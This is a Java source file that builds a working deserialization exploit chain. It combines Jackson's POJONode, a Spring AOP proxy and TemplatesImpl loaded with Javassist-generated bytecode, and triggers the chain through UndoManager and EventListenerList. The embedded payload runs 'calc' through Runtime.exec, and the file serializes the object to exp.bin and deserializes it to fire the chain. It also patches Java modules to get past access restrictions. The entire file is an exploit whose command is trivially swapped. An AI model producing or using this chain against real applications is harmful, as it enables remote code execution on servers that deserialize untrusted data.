package com.test;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import javassist.util.proxy.DefineClassHelper;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Vector;

public class MyExp {

    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
        jsonNode.removeMethod(writeReplace);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        jsonNode.toClass(classLoader, null);


        byte[] bytes = getTemplates();
        byte[] bytecode = ClassPool.getDefault().makeClass("useless").toBytecode();
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        bypassModule.patchModule(MyExp.class, aClass);
        Object templates = aClass.newInstance();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes, bytecode});
        setFieldValue(templates, "_name", "any");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_transletIndex", 0);

        Object proxy = makeTemplatesImplAopProxy(templates);

        POJONode node = new POJONode(proxy);

        bypassModule.patchModule(MyExp.class, UndoManager.class);
        EventListenerList eventListenerList = getEventListenerList(node);

        FileOutputStream fos = new FileOutputStream("exp.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(eventListenerList);
        oos.close();
        fos.close();

        FileInputStream fis = new FileInputStream("exp.bin");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
        fis.close();

    }


    public static Object makeTemplatesImplAopProxy(Object templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList list = new EventListenerList();
        UndoManager undomanager = new UndoManager();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static byte[] getTemplates() throws CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.importPackage("java.io");
        CtClass ctClass = pool.makeClass("Calc");
        CtConstructor ctConstructor = ctClass.makeClassInitializer();
        ctConstructor.setBody("try {\n" +
                "            Runtime.getRuntime().exec(\"calc\");\n" +
                "        } catch (IOException e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");
        byte[] bytecode = ctClass.toBytecode();
        return bytecode;
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}
